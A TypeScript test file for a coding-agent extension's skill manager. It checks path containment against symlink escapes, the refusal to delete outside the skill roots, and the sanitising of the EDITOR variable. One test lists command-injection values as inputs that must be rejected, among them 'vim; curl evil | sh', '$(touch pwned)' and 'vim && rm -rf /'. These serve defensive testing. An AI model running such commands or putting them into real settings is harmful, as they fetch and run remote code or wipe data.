import test from "node:test";
import assert from "node:assert/strict";
import { existsSync, mkdirSync, mkdtempSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  deleteSkillEntry,
  isContainedInSkillRoots,
  safeEditor,
} from "../src/extension/skills/skill-manager.ts";
import type { SkillEntry } from "../src/extension/skills/skill-registry.ts";

/** Run `fn` with `PI_CODING_AGENT_DIR` pointed at `agentDir`. */
function withAgentDir<T>(agentDir: string, fn: () => T): T {
  const previous = process.env.PI_CODING_AGENT_DIR;
  process.env.PI_CODING_AGENT_DIR = agentDir;
  try {
    return fn();
  } finally {
    if (previous === undefined) delete process.env.PI_CODING_AGENT_DIR;
    else process.env.PI_CODING_AGENT_DIR = previous;
  }
}

test("isContainedInSkillRoots accepts paths inside the canonical skill roots", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    const projectSkill = join(cwd, "skills", "demo");
    const dotPiSkill = join(cwd, ".pi", "skills", "demo");
    const globalSkill = join(agentDir, "skills", "demo");
    for (const dir of [projectSkill, dotPiSkill, globalSkill]) {
      mkdirSync(dir, { recursive: true });
      writeFileSync(join(dir, "SKILL.md"), "# demo\n", "utf8");
    }

    withAgentDir(agentDir, () => {
      assert.equal(isContainedInSkillRoots(projectSkill, cwd), true);
      assert.equal(isContainedInSkillRoots(dotPiSkill, cwd), true);
      assert.equal(isContainedInSkillRoots(globalSkill, cwd), true);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("isContainedInSkillRoots rejects paths outside the roots and the roots themselves", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    const outside = join(root, "outside", "evil");
    const skillsRoot = join(cwd, "skills");
    mkdirSync(outside, { recursive: true });
    mkdirSync(skillsRoot, { recursive: true });

    withAgentDir(agentDir, () => {
      assert.equal(isContainedInSkillRoots(outside, cwd), false);
      // The root itself is not a deletable entry (relative path is "").
      assert.equal(isContainedInSkillRoots(skillsRoot, cwd), false);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("isContainedInSkillRoots fails closed on missing paths", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    mkdirSync(join(cwd, "skills"), { recursive: true });

    withAgentDir(agentDir, () => {
      assert.equal(
        isContainedInSkillRoots(join(cwd, "skills", "gone"), cwd),
        false,
      );
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("isContainedInSkillRoots accepts catalogued prompt directories", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    const promptDir = join(cwd, "prompts", "demo");
    mkdirSync(promptDir, { recursive: true });
    writeFileSync(join(promptDir, "SKILL.md"), "# demo\n", "utf8");
    mkdirSync(join(agentDir, "prompts", "global-demo"), { recursive: true });
    writeFileSync(join(agentDir, "prompts", "global-demo", "SKILL.md"), "# g\n", "utf8");

    withAgentDir(agentDir, () => {
      assert.equal(isContainedInSkillRoots(promptDir, cwd), true);
      assert.equal(
        isContainedInSkillRoots(join(agentDir, "prompts", "global-demo"), cwd),
        true,
      );
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("isContainedInSkillRoots rejects a skills root that realpaths outside cwd and agent", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    const home = join(root, "home");
    mkdirSync(cwd, { recursive: true });
    mkdirSync(home, { recursive: true });
    writeFileSync(join(home, "SKILL.md"), "# evil\n", "utf8");
    try {
      symlinkSync(home, join(cwd, "skills"), "dir");
    } catch {
      return;
    }

    withAgentDir(agentDir, () => {
      assert.equal(isContainedInSkillRoots(home, cwd), false);
      assert.equal(isContainedInSkillRoots(join(home, "SKILL.md"), cwd), false);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("isContainedInSkillRoots rejects a skills root that realpaths to cwd", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    mkdirSync(cwd, { recursive: true });
    mkdirSync(join(cwd, "src"), { recursive: true });
    const nestedSkill = join(cwd, "src", "nested");
    mkdirSync(nestedSkill, { recursive: true });
    const nestedFile = join(nestedSkill, "SKILL.md");
    writeFileSync(nestedFile, "# nested\n", "utf8");
    try {
      symlinkSync(cwd, join(cwd, "skills"), "dir");
    } catch {
      return;
    }

    withAgentDir(agentDir, () => {
      assert.equal(isContainedInSkillRoots(nestedSkill, cwd), false);
      assert.equal(isContainedInSkillRoots(nestedFile, cwd), false);
      assert.throws(
        () => deleteSkillEntry(promptDirEntry(nestedFile, nestedSkill, "nested"), cwd),
        /refusing to delete outside skill roots/,
      );
      assert.equal(existsSync(nestedFile), true);
      assert.equal(existsSync(join(cwd, "src")), true);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

/** Build a prompts-category directory skill for delete-guard tests. */
function promptDirEntry(filePath: string, baseDir: string, name: string): SkillEntry {
  return {
    name,
    description: "demo",
    filePath,
    baseDir,
    isDirectorySkill: true,
    category: "prompts",
    disableModelInvocation: false,
    sizeBytes: 1,
    lineCount: 1,
    mtimeMs: Date.now(),
    frontmatterKeys: [],
  };
}

test("deleteSkillEntry recursively removes a catalogued prompts directory", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    const promptDir = join(cwd, "prompts", "demo");
    mkdirSync(promptDir, { recursive: true });
    const filePath = join(promptDir, "SKILL.md");
    writeFileSync(filePath, "# demo\n", "utf8");
    writeFileSync(join(promptDir, "notes.md"), "keep-me-not\n", "utf8");

    withAgentDir(agentDir, () => {
      deleteSkillEntry(promptDirEntry(filePath, promptDir, "demo"), cwd);
      assert.equal(existsSync(promptDir), false);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("deleteSkillEntry refuses paths outside skill roots", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    const outside = join(root, "outside", "evil");
    mkdirSync(cwd, { recursive: true });
    mkdirSync(outside, { recursive: true });
    const filePath = join(outside, "SKILL.md");
    writeFileSync(filePath, "# evil\n", "utf8");

    withAgentDir(agentDir, () => {
      assert.throws(
        () => deleteSkillEntry(promptDirEntry(filePath, outside, "evil"), cwd),
        /refusing to delete outside skill roots/,
      );
      assert.equal(existsSync(filePath), true);
      assert.equal(existsSync(outside), true);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("isContainedInSkillRoots rejects symlinks that resolve outside the roots", () => {
  const root = mkdtempSync(join(tmpdir(), "wishcraft-skills-"));
  try {
    const agentDir = join(root, "agent");
    const cwd = join(root, "project");
    const skillsRoot = join(cwd, "skills");
    const outside = join(root, "outside");
    mkdirSync(skillsRoot, { recursive: true });
    mkdirSync(outside, { recursive: true });
    writeFileSync(join(outside, "SKILL.md"), "# evil\n", "utf8");

    const link = join(skillsRoot, "escape");
    try {
      symlinkSync(outside, link, "dir");
    } catch {
      return; // platform without symlink permission; skip
    }

    withAgentDir(agentDir, () => {
      assert.equal(isContainedInSkillRoots(link, cwd), false);
    });
  } finally {
    rmSync(root, { recursive: true, force: true });
  }
});

test("safeEditor returns a bare path-like editor unchanged", () => {
  const previous = process.env.EDITOR;
  try {
    for (const value of ["vim", "nvim", "/usr/bin/code", "emacs-nox"]) {
      process.env.EDITOR = value;
      assert.equal(safeEditor(), value);
    }
  } finally {
    if (previous === undefined) delete process.env.EDITOR;
    else process.env.EDITOR = previous;
  }
});

test("safeEditor falls back to nvim for unsafe or empty values", () => {
  const previous = process.env.EDITOR;
  try {
    for (const value of [
      "code --wait",
      "vim; curl evil | sh",
      "$(touch pwned)",
      "vim && rm -rf /",
      "",
      "   ",
    ]) {
      process.env.EDITOR = value;
      assert.equal(safeEditor(), "nvim");
    }
    delete process.env.EDITOR;
    assert.equal(safeEditor(), "nvim");
  } finally {
    if (previous === undefined) delete process.env.EDITOR;
    else process.env.EDITOR = previous;
  }
});
